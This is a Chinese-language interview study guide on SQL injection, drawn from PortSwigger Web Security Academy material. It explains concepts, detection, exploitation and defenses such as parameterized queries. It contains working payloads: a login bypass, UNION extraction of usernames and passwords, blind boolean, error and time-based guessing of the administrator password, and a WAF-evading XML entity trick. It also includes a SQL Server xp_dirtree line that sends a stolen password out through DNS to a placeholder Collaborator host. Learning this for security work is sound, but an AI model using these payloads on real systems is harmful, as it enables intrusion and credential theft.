# SQL 注入 面试精讲

> 内容来源：PortSwigger Web Security Academy
> 整理原则：按面试常见追问链路组织，从概念到实战利用再到防御，每个点都能用自己话说清楚
> 建议使用方式：先理解原理，再动手在靶场中复现，最后用自己的语言组织回答

---

## 一、基础概念（面试开局必问）

### 1. 什么是 SQL 注入？

SQL 注入（SQLi）是一种 Web 安全漏洞，攻击者通过在输入中插入恶意 SQL 代码，干扰应用与数据库的查询交互。攻击者可以：

- 查看本无权访问的数据（其他用户信息、敏感业务数据等）
- 修改或删除数据，对应用造成持久性影响
- 在某些情况下进一步攻陷服务器或后端基础设施
- 发起拒绝服务攻击

核心原因：**应用将用户输入直接拼接到 SQL 查询字符串中，未做参数化处理。**

### 2. SQL 注入的危害有多大？

- 敏感数据泄露：密码、信用卡信息、个人身份信息
- 数据篡改/删除：造成业务数据永久性损坏
- 获取持久后门：长期潜伏，不易发现
- 监管罚款和声誉损失（历史上多起重大数据泄露事件都涉及 SQL 注入）

### 3. SQL 注入漏洞通常出现在哪些位置？

大多数 SQLi 出现在 `SELECT` 语句的 `WHERE` 子句中，但以下位置也常见：

- `UPDATE` 语句中，更新值或 `WHERE` 子句
- `INSERT` 语句中，插入的值
- `SELECT` 语句中，表名或列名位置
- `SELECT` 语句中，`ORDER BY` 子句
- 任何被应用拼接到 SQL 查询的用户可控输入（包括 JSON、XML 等格式）

---

## 二、如何发现 SQL 注入（检测方法论）

### 4. 面试问"你怎么检测一个参数是否存在 SQL 注入？"

系统化的手动测试步骤：

1. **单引号测试**：提交 `'`，观察是否返回错误或异常响应
2. **布尔条件测试**：提交 `OR 1=1` 和 `OR 1=2`，对比两次响应的差异
3. **时间延迟测试**：提交能触发时间延迟的 payload（如 `'; WAITFOR DELAY '0:0:10'--`），观察响应时间
4. **OAST 外带测试**：提交能触发外部 DNS/HTTP 请求的 payload，在可控服务器上监控是否有回连
5. **SQL 语法基准测试**：提交能使条件为真和为假的语法，对比响应差异

同时在实践中也可以使用 Burp Scanner 等自动化工具快速定位大部分注入点。

---

## 三、经典利用场景（面试重点）

### 5. 如何利用 SQL 注入获取隐藏数据？

场景：商城应用按分类显示商品，URL 为 `/products?category=Gifts`，后端查询为：

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**攻击 1 -- 注释掉后续条件**：

```
输入: Gifts'--
生成: SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

`--` 是 SQL 注释符，后续的 `AND released = 1` 被注释掉，未发布商品也会显示。

**攻击 2 -- OR 1=1 绕过所有条件**：

```
输入: Gifts'+OR+1=1--
生成: SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

`1=1` 恒为真，返回所有商品。

注意：`OR 1=1` 如果落入 UPDATE/DELETE 语句可能导致数据被意外修改或删除，需谨慎。

### 6. 如何利用 SQL 注入绕过登录？

假设登录验证查询为：

```sql
SELECT * FROM users WHERE username = '输入' AND password = '输入'
```

攻击：用户名输入 `administrator'--`，密码随意或留空，生成：

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

密码校验部分被注释，直接以 administrator 身份登录。

---

## 四、UNION 攻击（面试高频考点）

### 7. UNION 攻击是什么？两个必要条件是什么？

`UNION` 关键字允许执行一个或多个额外的 `SELECT` 查询，并将结果附加到原始查询结果中：

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

两个必要条件：

1. **列数相同**：每个查询返回的列数必须一致
2. **数据类型兼容**：对应列的数据类型必须兼容

### 8. 如何确定原始查询返回的列数？

**方法一：ORDER BY 法**

依次递增列索引直到报错：

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  -- 如果这里报错，说明实际有 2 列
```

报错示例：`The ORDER BY position number 3 is out of range`

**方法二：UNION SELECT NULL 法**

依次增加 NULL 数量直到不报错：

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--  -- 不报错说明有 3 列
```

使用 `NULL` 的原因是它可以转换为任何常见数据类型，最大化兼容性。

Oracle 数据库特殊：`SELECT` 必须有 `FROM`，用内置表 `dual`：`' UNION SELECT NULL FROM DUAL--`

### 9. 确定列数后，如何找出哪些列可以承载字符串数据？

逐列放入字符串测试值，其他列用 NULL 填充（假设已知共 4 列）：

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

如果某列不兼容字符串类型，会报错：`Conversion failed when converting the varchar value 'a' to data type int`。不报错且响应中出现 `'a'` 的列即适合存放字符串。

### 10. 列数和字符串列都确定了，如何拖取其他表的数据？

假设：原始查询返回 2 列，都能放字符串，数据库有 `users` 表含 `username` 和 `password` 列：

```
' UNION SELECT username, password FROM users--
```

如果不知道表名和列名，需要先通过 `information_schema.tables` 和 `information_schema.columns` 查询数据库结构。

### 11. 原始查询只返回一列，如何获取多个字段的值？

使用字符串拼接，将多个字段连在一起，用分隔符区分：

**Oracle**：`' UNION SELECT username || '~' || password FROM users--`
**MySQL**：`' UNION SELECT CONCAT(username, '~', password) FROM users--`
**SQL Server**：`' UNION SELECT username + '~' + password FROM users--`

结果示例：`administrator~s3cure`、`wiener~peter`

---

## 五、盲 SQL 注入（面试最难的追问）

### 12. 什么是盲 SQL 注入？和普通 SQLi 有什么区别？

盲 SQL 注入是指存在 SQL 注入漏洞，但 HTTP 响应中**不直接返回查询结果或数据库错误详情**。UNION 攻击等方法依赖可视化结果，在这里无效。需要借助其他技术间接推断数据。

主流利用技术有四种：
- 条件响应
- 条件错误
- 时间延迟
- 带外通道（OAST）

### 13. 如何利用"条件响应"进行盲注？

场景：应用根据查询是否返回数据给出不同行为（如是否显示 "Welcome back" 消息）。

Cookie `TrackingId` 的查询：
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'xxx'
```

利用链路：

```
-- 确认注入点
' AND '1'='1   -- 有 "Welcome back"
' AND '1'='2   -- 无 "Welcome back"

-- 逐字符猜解密码（SUBSTRING 某些数据库叫 SUBSTR）
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm   -- 有响应
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't   -- 无响应
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's   -- 有响应，首字符为 s
```

通过二分法逐字符确定，最终拿到完整密码。

### 14. 条件响应不奏效时，如何用"条件错误"进行盲注？

场景：无论查询返回什么，应用响应都一样（没有 "Welcome back" 这样的区分）。

思路：用 `CASE WHEN` 配合 `1/0`（除零错误），让数据库**仅在条件为真时抛出错误**：

```
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a   -- 不报错（条件假，返回 'a'）
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a   -- 报错（条件真，执行 1/0）
```

逐字符猜解密码：

```
' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

根据是否返回错误来推断条件真假。

### 15. 什么是"详细错误信息注入"（Verbose Error-based SQLi）？

如果数据库配置不当，错误信息会直接回显到响应中，利用 `CAST()` 将字符串强制转换为不兼容类型，让错误消息中**直接包含数据**：

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

错误示例：
```
ERROR: invalid input syntax for type integer: "Example data"
```

这样盲 SQLi 就变成了可见注入，数据直接出现在错误信息里，无需逐字符猜测。

### 16. 条件响应和条件错误都不使用（应用统一处理了所有错误），还能怎么利用？

**使用时间延迟**：让数据库仅在条件为真时发生延迟，通过响应时间判断条件真假。

SQL Server 示例：
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--   -- 不延迟（条件假）
'; IF (1=1) WAITFOR DELAY '0:0:10'--   -- 延迟 10 秒（条件真）
```

逐字符猜解：
```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
```

不同数据库的时间延迟函数不同，需要根据数据库类型选择合适语法。

### 17. 时间延迟也不使用（异步执行 + 统一错误处理），还有什么办法？

**使用带外通道（OAST）**：让数据库主动发起外部网络请求到攻击者控制的服务器，通过 DNS 或 HTTP 回调来外传数据。

最常用的工具是 Burp Collaborator。

SQL Server DNS 带外示例：

```sql
-- 触发 DNS 查找确认漏洞
'; exec master..xp_dirtree '//xxx.burpcollaborator.net/a'--

-- 外传数据：把 Administrator 的密码拼到子域名中
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.xxx.burpcollaborator.net/a"')--
```

DNS 查询会被记录在 Collaborator 服务器上，例如看到 `S3cure.xxx.burpcollaborator.net`，说明密码是 `S3cure`。

OAST 技术是盲注中最强的方法：能直接外传完整数据，成功率高，且很多生产网络允许 DNS 出口流量。

---

## 六、二阶 SQL 注入

### 18. 什么是二阶 SQL 注入（Second-order SQLi）？

- **一阶 SQL 注入**：用户输入从 HTTP 请求直接拼入 SQL 查询，立即触发漏洞
- **二阶 SQL 注入**：用户输入先被存储到数据库中（存储时做了安全处理，无漏洞），但后续在其他请求中从数据库取出该数据并再次拼入 SQL 查询时，**不当处理**导致注入

也称为"存储型 SQL 注入"。开发者在第一次入库时做了参数化，但取出来使用时却认为"数据库里出来的数据是可信的"，直接拼接到查询中，埋下漏洞。

---

## 七、数据库信息探测

### 19. 拿到一个 SQL 注入点后，如何识别数据库类型？

不同数据库有不同特征，通常通过以下方式识别：

- **版本查询**：Oracle 用 `SELECT * FROM v$version`，MySQL 用 `SELECT @@version`，SQL Server 用 `SELECT @@version`
- **字符串拼接语法差异**：Oracle 用 `||`，MySQL 用 `CONCAT()` 或空格（`'a' 'b'`），SQL Server 用 `+`
- **注释语法差异**：`--` 在 MySQL 后面必须跟空格，也可以用 `#`
- **错误信息特征**：不同数据库的报错格式不同
- **特定表/函数差异**：Oracle 有 `dual` 表，MySQL 有 `information_schema.tables`

### 20. 如何获取数据库中的表和列信息？

大多数数据库都支持 `information_schema`（Oracle 除外，使用 `all_tables` / `all_tab_columns`）：

```sql
-- 列出现有表（大多数数据库）
SELECT * FROM information_schema.tables

-- 列出现有列
SELECT * FROM information_schema.columns WHERE table_name = 'users'
```

---

## 八、不同上下文中的 SQL 注入

### 21. SQL 注入只能在 URL 参数中吗？

不是。任何被应用处理并拼入 SQL 查询的**可控输入**都可能成为注入点：

- JSON 参数
- XML 字段
- HTTP 请求头（Cookie、User-Agent、Referer 等）
- 文件上传的参数

### 22. WAF 拦截了关键词（如 SELECT），如何绕过？

通过编码和转义来混淆 payload。例如 XML 格式中的 SQL 注入：

```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

`&#x53;` 是字符 `S` 的 XML 十六进制转义，服务器端解码后才传给 SQL 解析器，绕过基于明文关键词的检测。

---

## 九、防御方案（面试必问的收尾）

### 23. 如何防御 SQL 注入？

**核心方案：使用参数化查询（Prepared Statement）**

错误写法（拼接字符串）：
```java
String query = "SELECT * FROM products WHERE category = '" + input + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

正确写法（参数化）：
```java
PreparedStatement stmt = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
stmt.setString(1, input);
ResultSet rs = stmt.executeQuery();
```

**关键点**：
- 查询字符串必须是硬编码常量，不能包含任何变量
- 不要"凭感觉判断"某段数据是否可信然后区别对待，容易出错
- 参数化查询适用于 WHERE、INSERT、UPDATE 中的数据值，**不适用于表名、列名、ORDER BY 子句**
- 对于表名/列名/ORDER BY 这些位置，使用**白名单校验**或不同的逻辑实现

**还有其它的方法就是黑白名单限制，还要采用最小权限原则，即使数据库真的被入侵了也可以通过约束权限来减少危害。**

### 24. 盲注的防御方法和普通 SQL 注入一样吗？

一样。虽然盲注的利用技术更复杂，但根本原因相同——用户输入干扰了 SQL 查询结构。使用参数化查询可以从根源上杜绝所有类型（普通、盲注、二阶）的 SQL 注入。

---

## 十、面试现场回答模板

### 面试官问："说说你对 SQL 注入的理解？"

建议回答框架（1-2 分钟）：

1. **定义**：SQL 注入是一种将恶意 SQL 代码插入应用查询的漏洞，根本原因是用户输入直接拼接到 SQL 语句中
2. **危害**：数据泄露、数据篡改、获取服务器权限
3. **分类**：分为常规注入（结果可见）和盲注（结果不可见），盲注又包括布尔盲注、时间盲注、报错盲注、OAST 外带
4. **利用方式**：注释绕过、OR 恒真条件绕过、UNION 联合查询拖取其他表数据、盲注逐字符推断
5. **防御**：参数化查询是根本方案，配合输入校验和白名单
6. **如果你有实战经验**：加一句"我在靶场中实际操作过..."会加分

### 面试官追问："UNION 攻击的两个条件是什么？"

直接回答：(1) 列数相同 (2) 对应列数据类型兼容。然后说先 ORDER BY 或 UNION SELECT NULL 确定列数，再用字符串测试确定哪些列能承载文本数据，最后构造 payload 拖数据。

### 面试官追问："盲注有哪几种？说下区别"

四种：条件响应（依赖页面内容差异）、条件错误（用错误 vs 正常做区分）、时间延迟（用响应时间判断）、OAST 外带（让数据库主动外连攻击者服务器，可一次性外传完整数据）。OAST 最强大，其次时间延迟适用于所有盲注场景。
